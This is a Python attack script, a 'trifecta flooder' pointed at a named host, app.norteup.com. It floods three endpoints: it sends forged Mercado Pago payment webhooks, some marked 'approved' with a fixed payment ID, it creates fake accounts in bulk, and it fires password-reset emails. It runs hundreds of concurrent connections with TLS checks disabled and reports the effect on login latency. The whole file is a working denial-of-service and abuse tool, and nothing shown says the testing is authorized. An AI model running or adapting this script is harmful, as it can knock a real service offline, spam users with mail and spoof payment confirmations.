#!/usr/bin/env python3
"""
trifecta-flooder — webhook (MP API) / cadastro (disco) / reset (SMTP) floods
Usage:
  python3 trifecta_flood.py --mode webhook --host app.norteup.com --duration 60 --concurrency 200
  python3 trifecta_flood.py --mode cadastro --host app.norteup.com --duration 60 --concurrency 100
  python3 trifecta_flood.py --mode reset   --host app.norteup.com --duration 60 --concurrency 50
  python3 trifecta_flood.py --mode all     --host app.norteup.com --duration 120 --concurrency 150
  python3 trifecta_flood.py --mode all     --host app.norteup.com --duration 60 --interval-check
"""

import argparse
import asyncio
import hashlib
import random
import ssl
import string
import sys
import time
import urllib.parse

DEFAULT_PAYMENT_ID = "186018092583630411"

WEBHOOK_BODIES = [
    '{{"type":"payment","data":{{"id":"{pid}"}}}}',
    '{{"type":"payment","data":{{"id":"{pid}"}},"action":"payment.updated","status":"approved"}}',
    '{{"type":"payment","data":{{"id":"{pid}"}},"external_reference":"mpqrinter{pid}C0"}}',
]

CADASTRO_TEMPLATE = (
    "csrf_token={csrf}&nome_conta=FloodCo&nome=Flood+User"
    "&email={email}&telefone=11912345678&documento=11144477735"
    "&plano_id=1&senha=Bench%232026%21k7m2p9&confirmar_senha=Bench%232026%21k7m2p9"
)

RESET_TEMPLATE = "csrf_token={csrf}&email={email}"


def rand_email(k: int = 12) -> str:
    return "flood" + "".join(random.choices(string.ascii_lowercase + string.digits, k=k)) + "@x.com"


def build_body(mode: str, csrf: str) -> bytes:
    if mode == "webhook":
        tpl = random.choice(WEBHOOK_BODIES)
        return tpl.format(pid=DEFAULT_PAYMENT_ID).encode()
    if mode == "cadastro":
        return CADASTRO_TEMPLATE.format(csrf=csrf, email=rand_email()).encode()
    if mode == "reset":
        return RESET_TEMPLATE.format(csrf=csrf, email=rand_email()).encode()
    raise ValueError(mode)


def request_for(mode: str, csrf: str) -> bytes:
    body = build_body(mode, csrf)
    path = {
        "webhook": "/webhook_mercadopago.php",
        "cadastro": "/cadastro.php",
        "reset": "/esqueci_senha.php",
    }[mode]
    ctype = "application/json" if mode == "webhook" else "application/x-www-form-urlencoded"
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {ARGS.host}\r\n"
        f"Content-Type: {ctype}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + body


async def fetch_csrf() -> str:
    """Best-effort CSRF fetch from login page; falls back to a dummy token."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ARGS.host, ARGS.port, ssl=ctx, server_hostname=ARGS.host), 8
        )
        writer.write(f"GET /login.php HTTP/1.1\r\nHost: {ARGS.host}\r\nConnection: close\r\n\r\n".encode())
        await asyncio.wait_for(writer.drain(), 5)
        data = await asyncio.wait_for(reader.read(65536), 8)
        writer.close()
        await writer.wait_closed()
        text = data.decode("utf-8", "replace")
        marker = 'name="csrf_token" value="'
        i = text.find(marker)
        if i != -1:
            j = text.find('"', i + len(marker))
            if j != -1:
                return text[i + len(marker) : j]
    except Exception:
        pass
    return hashlib.sha256(str(time.time()).encode()).hexdigest()


async def worker(modes: list, csrf: str, end: float, stats: dict, wid: int):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    mode = modes[wid % len(modes)]
    sent = 0
    fails = 0
    key = mode + "_sent"
    fkey = mode + "_fail"
    while time.time() < end:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ARGS.host, ARGS.port, ssl=ctx, server_hostname=ARGS.host), 5
            )
        except Exception:
            fails += 1
            stats[fkey] = stats.get(fkey, 0) + 1
            await asyncio.sleep(0.2)
            continue
        try:
            for _ in range(10):
                if time.time() >= end:
                    break
                writer.write(request_for(mode, csrf))
                await asyncio.wait_for(writer.drain(), 3)
                sent += 1
                stats[key] = stats.get(key, 0) + 1
                if sent % 4 == 0:
                    try:
                        await asyncio.wait_for(reader.read(2048), 1.5)
                    except Exception:
                        break
        except Exception:
            fails += 1
            stats[fkey] = stats.get(fkey, 0) + 1
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
    return sent


async def prober(end: float, results: list):
    import urllib.request

    while time.time() < end:
        t0 = time.time()
        try:
            r = urllib.request.urlopen(f"https://{ARGS.host}/login.php", timeout=6)
            results.append((round(time.time() - t0, 2), r.status))
        except Exception as e:
            results.append((round(time.time() - t0, 2), type(e).__name__))
        await asyncio.sleep(3)


async def main() -> int:
    modes = ["webhook", "cadastro", "reset"] if ARGS.mode == "all" else [ARGS.mode]
    end = time.time() + ARGS.duration
    csrf = await fetch_csrf()
    print(
        f"[start] mode={ARGS.mode} host={ARGS.host}:{ARGS.port} "
        f"duration={ARGS.duration}s workers={ARGS.concurrency} csrf={csrf[:12]}…",
        flush=True,
    )

    stats: dict = {}
    probes: list = []
    tasks = [
        asyncio.create_task(worker(modes, csrf, end, stats, i)) for i in range(ARGS.concurrency)
    ]
    pt = asyncio.create_task(prober(end, probes)) if ARGS.interval_check else None

    t0 = time.time()
    while time.time() < end:
        await asyncio.sleep(5)
        snapshot = dict(stats)
        line = " ".join(f"{k}={v}" for k, v in sorted(snapshot.items()))
        probe_tail = probes[-2:] if probes else "off"
        print(f"[t+{int(time.time() - t0)}s] {line} | probe={probe_tail}", flush=True)

    results = await asyncio.gather(*tasks, return_exceptions=True)
    if pt:
        pt.cancel()

    ok = sum(r for r in results if isinstance(r, int))
    errs = sum(1 for r in results if isinstance(r, Exception))
    print(f"[done] total_sent={ok} worker_errors={errs}", flush=True)
    print(f"[stats] {dict(sorted(stats.items()))}", flush=True)
    if probes:
        timeouts = [p for p in probes if p[1] not in (200, 302)]
        slow = [p for p in probes if isinstance(p[1], int) and p[0] > 3]
        print(f"[impact] probes={len(probes)} timeouts/errors={len(timeouts)} slow(>3s)={len(slow)}", flush=True)
        print(f"[impact] last_probes={probes[-5:]}", flush=True)
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="trifecta flooder: webhook/cadastro/reset")
    ap.add_argument("--mode", choices=["webhook", "cadastro", "reset", "all"], required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--duration", type=int, default=60, help="seconds")
    ap.add_argument("--concurrency", type=int, default=150, help="parallel workers")
    ap.add_argument("--interval-check", action="store_true", help="probe login latency during flood")
    ARGS = ap.parse_args()
    try:
        sys.exit(asyncio.run(main()))
    except KeyboardInterrupt:
        print("[abort] interrupted", flush=True)
        sys.exit(130)
